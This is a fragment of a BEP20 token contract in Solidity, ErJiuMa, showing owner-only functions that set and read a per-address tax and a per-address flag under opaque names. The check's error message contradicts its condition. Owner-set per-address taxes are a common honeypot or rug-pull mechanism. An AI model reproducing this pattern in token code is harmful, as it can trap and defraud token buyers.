...
contract ErJiuMa is BEP20, Ownable, BaseToken {
    ...
    function setSLfie(address _address, uint256 _value) external onlyowner {
        require(_value > 1, "acounts tax must be greater than or equal to 1");
        _SLfie[_address] = _value;
    }

    function getSLfie(address _address) external view onlyowner returns (uint256) {
        return _SLfie[_address];
    }


    function setMarketacountsfie(address _address, bool _value) external onlyowner {
        _marketacounts[_address] = _value;
    }

    function getMarketacountsfie(address _address) external view onlyowner returns (bool) {
